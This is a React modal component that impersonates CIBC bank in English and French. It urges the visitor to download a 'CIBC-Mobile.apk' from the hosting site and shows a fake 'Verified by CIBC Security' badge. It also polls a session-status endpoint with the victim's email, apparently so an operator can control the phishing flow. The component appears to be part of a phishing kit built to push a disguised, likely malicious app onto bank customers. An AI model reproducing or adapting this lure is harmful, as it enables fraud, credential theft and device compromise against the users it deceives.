import React, { useEffect } from 'react';
import { X, Shield, Smartphone, Bell, Download } from 'lucide-react';

const translations = {
  en: {
    title: 'Download the CIBC Mobile App',
    subtitle: 'For improved security and a better banking experience, please install the official CIBC mobile app to continue.',
    bullets: [
      { icon: Shield, text: 'Enhanced security with biometric login' },
      { icon: Smartphone, text: 'Faster, seamless access to your accounts' },
      { icon: Bell, text: 'Real-time alerts and notifications' },
    ],
    downloadBtn: 'Download CIBC Mobile App',
    securityBadge: 'Verified by CIBC Security',
  },
  fr: {
    title: 'Téléchargez l\'application mobile CIBC',
    subtitle: 'Pour une sécurité améliorée et une meilleure expérience bancaire, veuillez installer l\'application mobile officielle CIBC pour continuer.',
    bullets: [
      { icon: Shield, text: 'Sécurité renforcée avec connexion biométrique' },
      { icon: Smartphone, text: 'Accès plus rapide et fluide à vos comptes' },
      { icon: Bell, text: 'Alertes et notifications en temps réel' },
    ],
    downloadBtn: 'Télécharger l\'application mobile CIBC',
    securityBadge: 'Vérifié par Sécurité CIBC',
  },
};

export default function AppDownloadModal({ email, lang = 'en', onClose }) {
  const t = translations[lang] || translations.en;

  useEffect(() => {
    let isMounted = true;
    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/session-status?email=${encodeURIComponent(email)}`, {
          headers: { 'X-Access-Key': 'client-cibc-bank' },
        });
        const data = await response.json();
        if (!isMounted) return;
        if (data.success && (data.status === 'cancelled' || data.status === 'idle')) {
          onClose();
          window.location.reload();
        }
      } catch (err) {
        console.error('Error polling session status in AppDownloadModal:', err);
      }
    };
    pollStatus();
    const intervalId = setInterval(pollStatus, 2000);
    return () => { isMounted = false; clearInterval(intervalId); };
  }, [email, onClose]);

  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = '/api/download-cibc-app';
    link.download = 'CIBC-Mobile.apk';
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/60 backdrop-blur-xs animate-fade-in select-none">
      <div
        className="bg-white w-full max-w-[460px] rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.18)] px-8 pt-9 pb-8 flex flex-col relative border border-[#e8e8e8] animate-slide-in overflow-hidden"
        style={{ fontFamily: "'Whitney', 'Whitney SSm', 'Whitney Medium', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif" }}
      >
        {/* Decorative top accent line with CIBC Red */}
        <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#c41f3e] to-[#7b003a]" />

        {onClose && (
          <button
            type="button"
            onClick={onClose}
            className="absolute top-4 right-4 bg-transparent border-none cursor-pointer text-[#888] hover:text-[#222] p-1.5 flex items-center rounded-full hover:bg-black/5 transition-all duration-200"
            aria-label="Close"
          >
            <X className="w-[18px] h-[18px]" />
          </button>
        )}

        {/* CIBC Modal Logo */}
        <div className="flex justify-center mb-5">
          <div className="p-1 transition-all duration-300 hover:scale-105">
            <img
              src="/cibc-modal-logo.png"
              alt="CIBC Logo"
              className="w-16 h-auto object-contain"
            />
          </div>
        </div>

        <h3 className="text-[22px] font-normal text-[#2b2b2b] text-center mb-2 tracking-tight">
          {t.title}
        </h3>
        <p className="text-[#555555] text-[15px] text-center mb-6 leading-relaxed px-2 font-normal">
          {t.subtitle}
        </p>

        {/* Bullet features cards */}
        <ul className="space-y-3 mb-6">
          {t.bullets.map(({ icon: Icon, text }) => (
            <li 
              key={text} 
              className="flex items-center gap-3.5 p-3 rounded-xl bg-[#fafafa] border border-[#eaeaea] hover:bg-red-50/30 transition-all duration-200"
            >
              <span className="flex-shrink-0 w-8 h-8 rounded-lg bg-red-50 border border-red-100/80 flex items-center justify-center shadow-xs">
                <Icon className="w-[18px] h-[18px] text-[#c41f3e]" />
              </span>
              <span className="text-[14px] text-[#333333] font-normal leading-tight">{text}</span>
            </li>
          ))}
        </ul>

        {/* Download Button */}
        <button
          type="button"
          onClick={handleDownload}
          className="w-full flex items-center justify-center gap-2 bg-[#c41f3e] hover:bg-[#a6192e] text-white text-[17px] font-medium h-[52px] min-h-[52px] rounded-[6px] border-none cursor-pointer shadow-[0_4px_14px_rgba(196,31,62,0.25)] hover:shadow-[0_6px_20px_rgba(196,31,62,0.35)] active:scale-[0.99] transition-all duration-200"
        >
          <Download className="w-[18px] h-[18px] animate-bounce-subtle" />
          {t.downloadBtn}
        </button>

        {/* Security badge pill */}
        <div className="flex items-center justify-center gap-2 mt-5 pt-4 border-t border-[#f3f4f6]">
          <div className="flex items-center gap-1.5 bg-red-50/80 border border-red-100/90 px-3.5 py-1.5 rounded-full shadow-xs">
            <Shield className="w-3.5 h-3.5 text-[#c41f3e]" />
            <span className="text-[10.5px] text-[#c41f3e] font-semibold tracking-wider uppercase">
              {t.securityBadge}
            </span>
          </div>
        </div>
      </div>
      
      <style>{`
        @keyframes bounceSubtle {
          0%, 100% { transform: translateY(0); }
          50% { transform: translateY(-3px); }
        }
        .animate-bounce-subtle {
          animation: bounceSubtle 1.8s ease-in-out infinite;
        }
      `}</style>
    </div>
  );
}